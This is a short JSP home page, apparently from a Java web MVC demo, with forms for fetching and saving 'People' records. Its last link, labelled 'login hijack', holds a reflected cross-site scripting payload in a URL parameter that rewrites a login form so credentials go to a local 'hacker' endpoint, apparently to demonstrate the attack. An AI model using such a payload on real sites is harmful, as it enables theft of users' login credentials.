
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
  <head>
    <title>home</title>
  </head>
  <body>

       <form action="./people/json/get" method="GET">
         <input type="submit" value="GET People">
       </form>
       <br>

       <form action="./people/json/postForm" method="POST">
         <input type="text" name="id" value="E001" size="30">
         <input type="text" name="name" value="Tony" size="30">
         <input type="submit" value="POST People">
       </form>
       <br>

        <form action="./people/save" method="POST">
            <input type="text" name="id" value="E002" size="20">
            <input type="text" name="name" value="Tom" size="20">
            <input type="submit" value="Save People">
        </form>

        <br>

        <a href="http://localhost:7881/webmvc/login?id=E2000"> login </a>
        <br>
        <a href='http://localhost:7881/webmvc/login?id="><script> var f=document.getElementById("login"); f.action="http://localhost:7882/hacker"; f.method="get";</script><span+s=" '> login hijack </a>




  </body>
</html>
